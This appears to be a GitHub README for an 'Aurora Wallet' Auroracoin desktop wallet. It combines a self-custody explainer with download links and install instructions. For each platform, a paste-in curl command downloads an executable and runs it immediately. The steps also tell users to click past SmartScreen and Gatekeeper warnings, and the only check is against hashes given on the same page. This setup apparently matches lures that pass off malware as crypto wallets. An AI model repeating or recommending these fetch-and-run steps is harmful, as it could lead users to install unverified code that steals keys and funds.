![Aurora Wallet self custody basics guide](assets/aurora-wallet-guide-article-banner.png)

# Self-custody basics: how to truly own your Auroracoin

Keys on your machine, a phrase on paper, and no third party between you and the chain.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


Self-custody means the keys are yours to hold and yours to lose, with no institution in between.

An exchange holds coins in its own wallets and shows you a number in a database. That works until it does not: a freeze, a breach, a bankruptcy or a withdrawal limit turns your balance into a support ticket. A desktop wallet removes that layer by keeping the keys on your own disk.

<!-- ARTICLE-BODY-BEGIN -->

## What ownership actually requires

Ownership is a private key that only you control, a backup that survives the machine, and the discipline not to hand either one to a stranger. Everything else is convenience.

Aurora Wallet generates the keys locally, encrypts them with your password and derives every address from a recovery phrase. Nothing is uploaded, and nothing is recoverable by a company on your behalf.

## The four habits

1. Write the recovery phrase on paper and store it in two separate places.
2. Encrypt the wallet file with a password you use nowhere else.
3. Keep a copy of the wallet file on an encrypted drive.
4. Test a restore once, so you know the backup works.

Those four habits cover the realistic failure modes: a dead disk, a stolen laptop, a fire and a forgotten password. Each one is cheap, and each one removes a scenario where the balance becomes unreachable.

## What self-custody asks in return

It asks you to be the support desk. A lost phrase cannot be reset, a wrong address cannot be reversed and a signed transaction cannot be recalled. In exchange, nobody can freeze your balance, limit your withdrawal or lose your coins in someone else's breach.

The two mistakes that cost the most are both avoidable: storing the phrase digitally and sending without checking the address. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md">Backup best practice</a> covers the first, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md">the transfer checklist</a> covers the second.

The wallet itself changes nothing about the network: the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> is software you run, not a service you subscribe to.

Understanding where the coin came from helps the rest make sense, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md">what Auroracoin is</a> covers the network's origin.

## FAQ

### Is a hardware wallet required for self-custody?

No. A desktop wallet on a clean machine with an encrypted file and a paper backup is genuine self-custody.

### Are exchange balances insured if something goes wrong?

Some are, partially, and none of them are your keys. That is the distinction self-custody removes.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Backup best practice](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/33-backup-best-practice.md)
- [On-chain transfer checklist](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/30-on-chain-transfer-checklist.md)
- [What is Auroracoin](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/37-what-is-auroracoin-aur.md)
- [Phishing and seed scams](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/35-phishing-seed-scams.md)
